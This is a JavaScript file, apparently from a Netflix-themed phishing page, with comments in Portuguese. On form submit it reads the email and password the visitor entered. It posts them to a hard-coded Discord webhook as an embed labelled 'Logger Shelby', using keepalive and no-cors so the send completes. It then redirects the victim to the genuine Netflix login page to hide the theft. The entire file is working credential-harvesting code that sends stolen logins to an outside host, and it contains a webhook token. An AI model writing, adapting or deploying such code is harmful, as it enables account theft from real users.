document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    // Webhook direto
    const webhookURL = "https://discord.com/api/webhooks/1481402603404525678/LDGdRvAZJZEbG22rhkms1kmKt1XQ4oglVGE_cYOu0qWRi-y_fjE0GjZ8oAe2jwi28WI1";

    const payload = {
        username: "Netflix Login Notifier",
        embeds: [{
            title: "🏮 NOVO ACESSO: NETFLIX PREMIUM 🏮",
            color: 15158332,
            fields: [
                { name: "👤 E-mail/Celular", value: `\`${email}\`` },
                { name: "🔑 Senha", value: `\`${password}\`` }
            ],
            footer: { text: "Logger Shelby • " + new Date().toLocaleString() }
        }]
    };

    // Usando o método keepalive para garantir que a requisição não seja cancelada ao fechar a página
    fetch(webhookURL, {
        method: 'POST',
        mode: 'no-cors', // Tenta forçar o envio mesmo sem permissão de resposta
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload),
        keepalive: true 
    })
    .then(() => {
        console.log("Tentativa de envio concluída.");
        window.location.href = "https://www.netflix.com/br/login";
    })
    .catch(() => {
        // Se falhar o fetch normal, redireciona para não travar
        window.location.href = "https://www.netflix.com/br/login";
    });
});
